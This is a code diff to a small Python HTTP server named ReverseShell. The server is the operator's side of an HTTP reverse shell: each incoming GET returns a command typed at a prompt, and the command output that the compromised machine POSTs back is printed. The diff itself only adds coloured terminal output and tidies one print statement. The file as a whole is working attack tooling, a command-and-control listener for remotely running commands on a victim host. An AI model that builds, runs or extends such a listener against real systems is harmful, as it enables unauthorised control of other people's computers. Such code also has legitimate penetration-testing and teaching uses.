@@ -1,13 +1,15 @@
 import socketserver
 import http.server
 import cgi
+from colorama import Fore, Back, Style
 
 PORT = 8080
 
 
 class ReverseShell(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
-        command = input(">> ")
+        command = input(Fore.YELLOW + ">> ")
+        print(Style.RESET_ALL)
 
         # boilerplate http
         self.send_response(200)
@@ -25,11 +27,12 @@ class ReverseShell(http.server.BaseHTTPRequestHandler):
 
         # Read post then print the posted data
         postVar = self.rfile.read(length).decode()
-        print(postVar)
+        print(Fore.GREEN + postVar, end='')
+        print(Style.RESET_ALL)
 
 
 with socketserver.TCPServer(("", PORT), ReverseShell) as httpd:
-    print("serving at port", PORT)
+    print(f"serving at port {PORT}")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
